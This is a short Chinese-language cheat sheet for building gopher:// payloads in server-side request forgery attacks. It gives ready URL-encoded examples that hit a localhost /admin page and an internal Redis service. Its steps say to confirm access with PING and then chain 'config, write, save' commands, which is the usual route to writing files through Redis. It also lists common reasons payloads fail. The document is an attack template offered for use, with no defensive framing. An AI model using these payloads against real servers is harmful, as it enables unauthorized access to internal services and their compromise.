# Gopher 模板

## 基础格式
```txt
gopher://<host>:<port>/_<urlencoded_raw_tcp_data>
```

## HTTP 原始请求示例
```txt
gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0aConnection:close%0d%0a%0d%0a
```

## Redis RESP 示例（简化）
原始：
```txt
*1\r\n$4\r\nPING\r\n
```
编码后（示意）：
```txt
gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A
```

## 使用步骤
1. 先构造最短命令（如 `PING`）验证通路。
2. 再构造多命令链（配置、写入、保存）。
3. 每次只改一段，便于定位失败原因。

## 常见失败点
- `\r\n` 少写。
- URL 编码不完整。
- 目标服务权限不足。
